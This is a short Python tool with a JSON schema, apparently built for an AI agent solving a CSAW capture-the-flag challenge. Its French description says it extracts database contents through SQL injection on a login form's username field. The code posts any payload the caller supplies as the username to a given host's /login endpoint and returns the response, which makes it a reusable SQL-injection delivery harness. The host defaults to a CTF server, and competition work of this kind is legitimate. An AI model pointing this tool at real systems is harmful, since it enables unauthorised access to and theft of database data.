SCHEMA = {
  "name": "sql_extractor",
  "description": "Extrait des données de la base via SQLi sur le champ username du login",
  "parameters": {
    "properties": {
      "host": {
        "type": "string"
      },
      "payload": {
        "type": "string"
      },
      "port": {
        "type": "integer"
      }
    },
    "required": [
      "host",
      "port",
      "payload"
    ],
    "type": "object"
  }
}

import requests
from urllib.parse import quote

def main(args):
    host = args.get("host", "csale.chal.csaw.io")
    port = args.get("port", 5000)
    payload = args.get("payload", "")
    
    url = f"http://{host}:{port}/login"
    
    # Faire une requête POST avec le payload comme username
    data = {"username": payload, "password": "test"}
    
    try:
        resp = requests.post(url, data=data, timeout=10)
        # Retourner le contenu de la réponse
        return f"Status: {resp.status_code}\nContent length: {len(resp.text)}\nFirst 500 chars:\n{resp.text[:500]}"
    except Exception as e:
        return f"Error: {e}"

if __name__ == "__main__":
    import json as _json, sys as _sys
    _args = _json.loads(_sys.argv[1]) if len(_sys.argv) > 1 else {}
    main(_args)
